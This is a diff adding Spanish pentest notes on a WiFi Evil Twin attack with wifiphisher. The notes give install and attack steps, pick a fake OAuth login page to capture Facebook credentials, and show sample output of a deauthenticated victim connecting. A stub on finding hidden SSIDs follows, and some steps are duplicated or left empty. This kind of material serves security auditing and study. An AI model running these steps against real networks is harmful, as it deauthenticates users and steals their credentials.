@@ -2725,6 +2725,96 @@ Ok, this is solved now. On v10.41 it will be able to work in both modes. Default
 
 
 
+## `Evil Twin` + `Phishing`
+
+### Ejemplos
+
+- [Auditoria Wifi con WifiPhisher](https://www.youtube.com/watch?v=fGEB7dAga7E)
+
+---
+
+### `WifiPhisher`
+
+- Instalación
+
+````sh
+apt install -y wifiphisher
+````
+
+### Alcances
+
+- **Este ataque necesita 2 adaptadores como mínimo**
+
+
+### Ataque
+
+````sh
+# 1. Capturar Redes alrededor (Aquí debemos elegir al objetivo que vamos a clonar para el ataque)
+wifiphisher
+
+# 2. Seleccionar la red que usaremos para atacar y hacerle phishing "Fz3r0_Air_PWN" y hacer Enter
+
+# 3. Seleccionar un escenario de Phishing:
+
+    # Aquí se puede elegir el que se prefiera, en este caso usaré el phishing de credenciales de Social Networks (2)
+        ## 2 - OAuth Login Page                                                                                                       
+        ## A free Wi-Fi Service asking for Facebook credentials to authenticate using OAuth
+        
+# 4. Una vez seleccionado, automáticamente empezará el ataque:
+
+    # +++ Aquí ya deberá aparecer el Evil Twin con el nombre del SSID seguido por un "2" ++++
+    
+    # - La víctima al der deautenticada de la red original se podría conectar al AP rougue o Evil Twin
+    # - También podría caer otra víctima al ser una red abierta
+    
+    # +++ Una vez que la vñictima caiga y escriba sus credenciales se verá algo así desde la Máquina Atacante:
+
+    # |                             
+    # Extensions feed:                                                                             | Wifiphisher 1.4GIT          DEAUTH/DISAS - 24:11:45:37:8d:f0                                                             | # ESSID: Fz3r0_Air_PWN        
+    # DEAUTH/DISAS - 0a:2b:11:03:eb:ee                                                             | Channel: 6                  DEAUTH/DISAS - 44:e5:17:06:e4:60                                                             | # AP interface: wlan1         
+    # DEAUTH/DISAS - aa:13:96:83:76:9e                                                             | Options: [Esc] Quit         Victim 44:e5:17:6:e4:60 probed for WLAN with ESSID: 'Fz3r0_Air_PWN' (Evil Twin)              |_____________________________
+    # Connected Victims:                                                                                                         44:e5:17:06:e4:60       10.0.0.57       Unknown Windows                                                                    
+                                                                                                                           
+    #  HTTP requests:                                                                                                             
+    #  [*] GET request from 10.0.0.57 for http://detectportal.firefox.com/canonical.html                                          
+    #  [*] GET request from 10.0.0.57 for http://detectportal.firefox.com/canonical.html                                          [*] GET request from 10.0.0.57 for http://www.msftconnecttest.com/connecttest.txt                                            
+    #  [*] GET request from 10.0.0.57 for http://detectportal.firefox.com/canonical.html                                          [*] GET request from 10.0.0.57 for http://detectportal.firefox.com/canonical.html             
+    
+# 5. Una vez seleccionado, automáticamente empezará el ataque:
+                                                                                      
+
+````
+
+````
+
+
+
+
+
+
+
+
+
+
+
+
+
+## Descubrir SSID oculto
+
+- [Obteniendo nombre de red wifi oculta (AndyHM)](https://www.youtube.com/watch?v=aaKTtROzR8E)
+
+
+1. Capturar PCAP y buscar un ccliente que haga probe request hacia el AP con SSID oculto, ahí viajará el SSID en texto plano
+
+````sh
+
+````
+
+
+
+
+
+
 
 
 
